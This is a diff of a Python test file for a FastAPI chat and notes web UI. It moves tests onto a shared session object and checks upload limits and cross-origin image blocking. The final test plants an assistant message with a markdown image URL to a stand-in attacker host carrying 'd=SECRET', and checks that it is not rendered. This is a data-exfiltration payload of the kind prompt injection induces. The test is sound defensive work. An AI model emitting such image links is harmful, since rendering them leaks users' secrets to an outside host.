@@ -27,8 +27,9 @@ from fastapi.testclient import TestClient  # noqa: E402
 def client(tmp_vault, tmp_path, monkeypatch):
     """Fresh module-level session per test, backed by a tmp fs vault."""
     from silica.ui.web import server
+    from silica.ui.web.session import SESSION
 
-    server._reset_session()
+    SESSION.reset()
     return TestClient(server.app), server
 
 
@@ -418,6 +419,7 @@ def test_an_oversized_upload_is_refused_and_leaves_no_partial_file(client, monke
     part already written must not stay behind in the vault."""
     from silica.config import CONFIG
     from silica.ui.web import server
+    from silica.ui.web.session import SESSION
 
     tc, _server = client
     _no_llm(monkeypatch, server)
@@ -432,12 +434,13 @@ def test_an_oversized_upload_is_refused_and_leaves_no_partial_file(client, monke
     assert resp.status_code == 413
     inbox = Path(CONFIG.vault_path) / "Inbox"
     assert not inbox.exists() or list(inbox.iterdir()) == []
-    assert server._busy is False  # the refused drop released the turn slot
+    assert SESSION.busy is False  # the refused drop released the turn slot
 
 
 def test_too_many_files_in_one_drop_are_refused_before_anything_is_written(client, monkeypatch):
     from silica.config import CONFIG
     from silica.ui.web import server
+    from silica.ui.web.session import SESSION
 
     tc, _server = client
     _no_llm(monkeypatch, server)
@@ -449,7 +452,7 @@ def test_too_many_files_in_one_drop_are_refused_before_anything_is_written(clien
     assert resp.status_code == 413
     inbox = Path(CONFIG.vault_path) / "Inbox"
     assert not inbox.exists() or list(inbox.iterdir()) == []
-    assert server._busy is False
+    assert SESSION.busy is False
 
 
 # --- ADR-0098 H6: an answer draws no image from another origin ---------------
@@ -496,8 +499,9 @@ def test_a_note_keeps_its_web_images():
 
 
 def test_a_reloaded_chat_draws_no_image_from_another_origin(client):
+    from silica.ui.web.session import SESSION
     tc, server = client
-    server.messages.append({"role": "assistant", "content": "![x](//attacker.example/p.png?d=SECRET)"})
+    SESSION.chat.messages.append({"role": "assistant", "content": "![x](//attacker.example/p.png?d=SECRET)"})
 
     html = tc.get("/messages").json()[-1]["html"]
     assert "<img" not in html and "image from attacker.example" in html
